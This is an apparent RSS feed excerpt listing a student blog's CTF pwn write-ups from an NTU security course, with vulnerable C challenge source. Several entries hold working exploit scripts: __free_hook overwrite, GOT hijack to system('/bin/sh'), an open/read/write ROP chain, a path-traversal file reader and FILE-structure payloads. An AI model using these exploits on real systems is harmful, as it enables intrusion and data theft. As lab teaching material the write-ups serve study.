0; unsigned long ans_addr = 0; cmp1 = rand() % 7; while ((cmp2 = rand() % 7) == cmp1); if (cmp1 > cmp2) { tmp = cmp1; cmp1 = cmp2; cmp2 = tmp; } printf("assert( %c == %p );\n", 'A' + cmp1, tcache_chk[ cmp1 ]); printf("%c == ?\t(send as hex format, e.g. \"%p\")\n> ", 'A' + cmp2, tcache_chk[ cmp1 ]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: %p\n", tcache_chk[ cmp2 ]); exit(0); } puts("\n----------- ** index chall ** -----------"); unsigned long *fastbin[2] = {0}; unsigned long fastbin_size = 0; unsigned long secret_idx = 0, result_idx = 0, res = 0; fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70 fastbin_size &amp;= ~0xf; fastbin[0] = (unsigned long *) malloc( fastbin_size ); fastbin[1] = (unsigned long *) malloc( fastbin_size ); printf("unsigned long *%c = (unsigned long *) malloc(0x%lx);\n", 'X', fastbin_size); printf("unsigned long *%c = (unsigned long *) malloc(0x%lx);\n", 'Y', fastbin_size); secret_idx = rand() % (fastbin_size / 8); fastbin[1][ secret_idx ] = 0xdeadbeef; result_idx = ((unsigned long)(&amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;fastbin[0][0])) / 8; printf("Y[%lu] = 0xdeadbeef;\n", secret_idx); printf("X[?] == 0xdeadbeef\t(just send an integer, e.g. \"8\")\n> "); scanf("%lu", &amp;res); if (fastbin[0][res] == 0xdeadbeef) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: %lu\n", result_idx); exit(0); } puts("\n----------- ** tcache fd chall ** -----------"); free(fastbin[0]); free(fastbin[1]); printf("free(X);\nfree(Y);\nassert( Y == %p );\n", fastbin[1]); printf("fd of Y == ?\t(send as hex format, e.g. \"%p\")\n> ", fastbin[1]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: 0x%lx\n", *fastbin[1]); exit(0); } puts("\n----------- ** fastbin fd chall (final) ** -----------"); puts("[*] Restore the chunk to X and Y"); printf("%c = (unsigned long *) malloc(0x%lx);\n", 'Y', fastbin_size); printf("%c = (unsigned long *) malloc(0x%lx);\n", 'X', fastbin_size); fastbin[1] = malloc(fastbin_size); fastbin[0] = malloc(fastbin_size); printf("[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n", fastbin_size + 0x10); void *tmpchk[7]; for (int i = 0; i &lt; 7; i++) tmpchk[i] = malloc(fastbin_size); for (int i = 0; i &lt; 7; i++) free(tmpchk[i]); printf("free(X);\nfree(Y);\nassert( Y == %p );\n", fastbin[1]); free(fastbin[0]); free(fastbin[1]); printf("fd of Y == ?\t(send as hex format, e.g. \"%p\")\n> ", fastbin[1]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts("Correct !"); memset(tmpbuf, 0, 0x31); int fd = open("/home/heapmath/flag", O_RDONLY); read(fd, tmpbuf, 0x30); close(fd); printf("Here is your flag: %s\n", tmpbuf); } else { puts("Wrong !"); printf("Ans: 0x%lx\n", *fastbin[1]); exit(0); } } :::</description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html</guid><description>Simple PWN 0x16(simple_smallbin) tags: CTF PWN eductf Version: Ubuntu 20.04
Background Original Code :::spoiler code
#include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *ptrs[7]; void *smallbin; int i; for (i = 0; i &lt; 7; i++) ptrs[i] = malloc(0x108); // 0x110 chunk size smallbin = malloc(0x108); malloc(0x18); // aim to fill up tcache while(i) free(ptrs[--i]); free(smallbin); // trigger unsorted bin dispatch malloc(0x870); return 0; } :::</description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html</guid><description>Simple PWN 0x17(UAF - leak information) tags: CTF PWN eductf Version: Ubuntu 20.04
UAF backgroud SS111-Pwn2 Advanced Binary Exploitation (Pwn) - Heap Exploitation Original Code #include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *p1, *p2; p1 = malloc(0x30); p2 = malloc(0x30); free(p1); free(p2); puts(p2); } If we set the pointer to NULL after it was freed, then we can get some vital info. from this chunk.</description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html</guid><description>Simple PWN 0x18(Lab - babynote) tags: CTF PWN eductf Version: Ubuntu 20.04
Background hook - SS111-Pwn2 Hook簡介 Hook Function (攔截函式) The process of free and priority Assume we malloc a memory with size over 0x410, then when we free it, it’ll be classified to Unsorted bin instead of tcache Original Code :::spoiler code</description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html</guid><description>Simple PWN 0x19(Lab - babyums - flag 1) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #define FLAG1 "flag{XXXXXXXX}" struct User { char name[0x10]; char password[0x10]; void *data; }; struct User *users[8]; static short int get_idx() { short int idx; printf("index\n> "); scanf("%hu", &amp;idx); if (idx >= 8) printf("no, no ..."), exit(1); return idx; } static short int get_size() { short int size; printf("size\n> "); scanf("%hu", &amp;size); if (size >= 0x500) printf("no, no ..."), exit(1); return size; } void add_user() { short int idx; idx = get_idx(); users[idx] = malloc(sizeof(*users[idx])); printf("username\n> "); read(0, users[idx]->name, 0x10); printf("password\n> "); read(0, users[idx]->password, 0x10); users[idx]->data = NULL; printf("success!\n"); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (users[idx]->data == NULL) users[idx]->data = malloc(size); read(0, users[idx]->data, size); printf("success!\n"); } void del_user() { short int idx; idx = get_idx(); free(users[idx]->data); free(users[idx]); printf("success!\n"); } void show_users() { for (int i = 0; i &lt; 8; i++) { if (users[i] == NULL || users[i]->data == NULL) continue; printf("[%d] %s\ndata: %s\n", i, users[i]->name, (char *)users[i]->data); } } void add_admin() { users[0] = malloc(sizeof(*users[0])); strcpy(users[0]->name, "admin"); strcpy(users[0]->password, FLAG1); users[0]->data = NULL; } int main() { char opt[2]; int power = 20; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf("**** User Management System ****\n"); add_admin(); while (power) { power--; printf("1. add_user\n" "2. edit_data\n" "3. del_user\n" "4. show_users\n" "5. bye\n" "> "); read(0, opt, 2); switch (opt[0]) { case '1': add_user(); break; case '2': edit_data(); break; case '3': del_user(); break; case '4': show_users(); break; case '5': exit(0); } } printf("No... no power..., b..ye...\n"); return 0; } :::</description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html</guid><description>Simple PWN 0x20(Lab - babyums - flag 2) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code Simple PWN 0x19(Lab - babyums - flag 1)
Exploit Very similar in this article: 0x18(Lab - babynote) :::spoiler code
from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10008) context.arch = 'amd64' def add_user(idx, user_name, user_passwd): r.sendafter(b'> ', b'1') r.sendlineafter(b'index\n> ', str(idx)) r.sendafter(b'username\n> ', user_name) r.sendafter(b'password\n> ', user_passwd) def edit_data(idx, note_size, message): r.sendafter(b"> ", b"2") r.sendlineafter(b'index\n> ', str(idx)) r.sendlineafter(b'size\n> ', str(note_size)) r.send(message) def del_user(idx): r.sendafter(b"> ", b"3") r.sendlineafter(b'index\n> ', str(idx)) def show_user(): r.sendafter(b"> ", b"4") '''------------------ Construct heap memory ------------------''' add_user(0, b'a'*8, b'aaaa') edit_data(0, 0x418, b'a') add_user(1, b'b'*8, b'bbbb') edit_data(1, 0x18, b'b') add_user(2, b'c'*8, b'cccc') '''------------------ Leak libc address ------------------''' del_user(0) show_user() r.recvuntil(b'data:') libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000 info(f"libc address: {hex(libc)}") free_hook_addr = libc + 0x1eee48 info(f"__free_hook address: {hex(free_hook_addr)}") libc_sys_addr = libc + 0x52290 info(f"__libc_system address: {hex(libc_sys_addr)}") '''------------------ Construct fake chunk ------------------''' data = b'/bin/sh\x00'.ljust(0x10, b'b') fake_chunk = flat( 0, 0x31, b'cccccccc', b'cccccccc', b'cccccccc', b'cccccccc', free_hook_addr ) edit_data(1, 0x48, data + fake_chunk) edit_data(2, 0x8, p64(libc_sys_addr)) del_user(1) r.interactive() :::</description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html</guid><description>Simple PWN 0x21(fopen, fread, fwrite, fclose) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler fopen
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; fp = fopen("./test", "r"); fclose(fp); return 0; } :::
:::spoiler fread
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; char buf[0x10]; fp = fopen("./test", "r"); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::
:::spoiler fwrite
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; char buf[0x10] = "TEST!!"; fp = fopen("./test_write", "r"); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::</description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html</guid><description>Simple PWN 0x22(Lab - AAR) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> char flag[0x10] = "FLAG{TEST}\n"; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen("/tmp/meow", "w"); read(0, buf, 0x1000); fwrite(buf, 0x10, 1, fp); return 0; } :::
Exploit - heap overflow + overlap flag from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10010) context.arch = 'amd64' flag_addr = 0x404050 raw_input() payload = flat( p64(0)*4, p64(0xfbad0800), #_flags p64(0), #_IO_read_ptr p64(flag_addr), #_IO_read_end p64(0), #_IO_read_base p64(flag_addr), #_IO_write_base p64(flag_addr+0x10), #_IO_write_ptr p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain p64(0x1) #_fileno ) r.send(payload) r.interactive()</description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html</guid><description>Simple PWN 0x23(Lab - AAW) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;string.h> #include &lt;fcntl.h> char flag[0x10] = "FLAG{TEST}\n"; char owo[] = "OWO!"; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen("/tmp/meow", "r"); read(0, buf, 0x1000); fread(buf, 0x10, 1, fp); if (strcmp(owo, "OWO!") != 0) write(1, flag, sizeof(flag)); return 0; } :::
Exploit from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10009) context.arch = 'amd64' owo_addr = 0x404070 raw_input() payload = flat( p64(0)*2, 0, 0x1e1, p64(0xfbad0000), #_flags O p64(0), #_IO_read_ptr O p64(0), #_IO_read_end O p64(0), #_IO_read_base X p64(owo_addr), #_IO_write_base O p64(0), #_IO_write_ptr X p64(0), #_IO_write_end X p64(owo_addr), #_IO_buf_base O p64(owo_addr+0x20), #_IO_buf_end O p64(0)*5, #_chain X p64(0) #_fileno O ) r.send(payload) raw_input() r.sendline(p64(2)*2) r.interactive()</description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html</guid><description>Simple PWN 0x31(2023 HW - Notepad - Stage - 1) Description &amp; Hint nc 10.113.184.121 10044
You should solve the PoW to invoke a new instance. You can use the pow_solver.py script in the released zip to solve the PoW. After you solve the PoW, the service will create a new container and show >you the port. Connect it to play this challenge! The container will be destroy at 5 minutes. So you should debug your exploit in your environment.</description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html</guid><description>Simple PWN 0x32(2023 HW - Notepad-Stage 2) Description &amp; Hint Try to get /flag_backend.
Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal. Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.
Source code 呈上題
Recon :::success Special Thanks @cs-otaku For the most of the Inspiration of the WP :::
Recap 在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下: def read_any_file(file_name): payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name offset = 0 res = '' while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != 'Read note failed.' and ret != "Couldn't open the file.": res += ret offset += 128 else: log.success(res) break return res ==漏洞發想== 透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 – 第一篇:C strings &amp; /proc，要做的事情和我們的幾乎一樣，簡單說就是</description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html</guid><description>Simple PWN 0x33(2023 Lab - ROP_RW) Background ROP chain
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;fcntl.h> char flag[0x10]; long secret; char empty_buf[0x30]; void check(char *input) { char pass[0x10]; char output[0x10]; for (int i = 0; i &lt; 2; ++i) { ((long *)pass)[i] = ((long *)input)[i] ^ secret; } if (strcmp(pass, "kyoumokawaii") == 0) { for (int i = 0; i &lt; 2; ++i) ((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i]; } printf("flag = %s\n", output); } int main(void) { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = 0; char buf[0x10]; fd = open("/home/chal/flag.txt", O_RDONLY); read(fd, flag, 0x10); close(fd); fd = open("/dev/urandom", O_RDONLY); read(fd, &amp;secret, sizeof(secret)); for (int i = 0; i &lt; 2; ++i) ((long *)flag)[i] = ((long *)flag)[i] ^ secret; printf("secret = %lx\n", secret); printf("> "); gets(buf); return 0; } :::</description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html</guid><description>Simple PWN 0x34 (2023 Lab - ret2plt) Background Got Hijack / BoF
Source code //gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt #include &lt;stdio.h> #include &lt;stdlib.h> int main(){ char buf[20]; setvbuf(stdout,0,2,0); printf("Try your best :"); gets(buf); puts("boom !");	} Recon checksec + file $ checksec chal [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped 首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看 流程: 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt== pop rdi ret puts got address puts plt 這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address) 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address # leak puts got address to calculate libc base address puts_addr = u64(r.recv(6).ljust(8, b'\x00')) libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去 # fetch user input -> /bin/sh\x00 pop_rdi_ret bss_addr gets_plt, 此時他就會像使用者要輸入，並把我們的輸入丟到bss address 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking== # fetch user input -> system address pop_rdi_ret puts_got gets_plt 此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system # system('/bin/sh\x00') pop_rdi_ret bss_addr puts_plt Exploit - Ret2Plt(leak base address) + Got Hijack(call system) from pwn import * r = process('./chal') # r = remote('10.113.184.121', 10053) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.arch = 'amd64' pop_rdi_ret = 0x0000000000401263 puts_got = 0x403368 puts_plt = 0x401070 gets_got = 0x403378 gets_plt = 0x401090 bss_addr = 0x403f00 payload = flat( # leak puts got address to calculate libc base address pop_rdi_ret, puts_got, puts_plt, # fetch user input -> /bin/sh\x00 pop_rdi_ret, bss_addr, gets_plt, # fetch user input -> system address pop_rdi_ret, puts_got, gets_plt, # system('/bin/sh\x00') pop_rdi_ret, bss_addr, puts_plt ) raw_input() r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload) print(r.recvline()) puts_addr = u64(r.recv(6).ljust(8, b'\x00')) log.info(f"puts address = {hex(puts_addr)}") libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] log.info(f'system address = {hex(system_addr)}') r.sendline(b'/bin/sh\x00') raw_input() r.sendline(p64(libc.symbols['system'])) r.interactive()</description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html</guid><description>Simple PWN 0x35(2023 Lab - Stack Pivot) Background Simple PWN - 0x09(stack pivoting) Simple PWN - 0x10(seccomp/Lab - rop2win)
Source code #include &lt;stdio.h> #include &lt;unistd.h> int main(void) { char buf[0x20]; read(0, buf, 0x80); return 0; } Recon 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall
checksec + file $ checksec chal [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped 首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫 找gadget leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來 gef➤ x/10i 0x448280 0x448280 &lt;read+16>: syscall => 0x448282 &lt;read+18>: cmp rax,0xfffffffffffff000 0x448288 &lt;read+24>: ja 0x4482e0 &lt;read+112> 0x44828a &lt;read+26>: ret 會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop Construct ROP 首先，我們的流程是 ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write== 會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload 寫入的bss_addr和main_fn address bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload trash_payload = b'a'*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) 之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn 用gdb跟一下，放完的結果大概是這樣 0x00007ffc884f3670│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ← $rsp, $rsi 0x00007ffc884f3678│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa" 0x00007ffc884f3680│+0x0010: "aaaaaaaaaaaaaaaa" 0x00007ffc884f3688│+0x0018: "aaaaaaaa" 0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &lt;transmem_list+0> add BYTE PTR [rax], al ← $rbp 0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &lt;main+12> lea rax, [rbp-0x20] 當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700 觀察main_fn的assembly gef➤ x/10i &amp;main 0x401cd5 &lt;main>: endbr64 0x401cd9 &lt;main+4>: push rbp 0x401cda &lt;main+5>: mov rbp,rsp 0x401cdd &lt;main+8>: sub rsp,0x20 0x401ce1 &lt;main+12>: lea rax,[rbp-0x20] 0x401ce5 &lt;main+16>: mov edx,0x80 0x401cea &lt;main+21>: mov rsi,rax 0x401ced &lt;main+24>: mov edi,0x0 0x401cf2 &lt;main+29>: call 0x448270 &lt;read> 0x401cf7 &lt;main+34>: mov eax,0x0 從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來 寫入bss_addr_open 我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下 file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00') ROP_open = flat( # Open file # fd = open("/home/chal/flag.txt", 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) r.sendline(file_addr + ROP_open) 首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方 寫入bss_addr_read 我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下 ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) r.sendline(file_addr + ROP_read) 寫入bss_addr_write 我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下 ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) r.sendline(file_addr + ROP_write) :::danger 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行</description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html</guid><description>Simple PWN 0x36(2023 HW - Notepad-Stage 3) Source code 呈上上題
Recon 這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程
首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address 知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣</description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html</guid><description>Simple PWN 0x37(2023 HW - HACHAMA) Background stack pivot rop bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include "SECCOMP.h" long n; char msg[0x20]; long n2; struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(read), Allow(write), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror("Seccomp Error"); exit(1); } 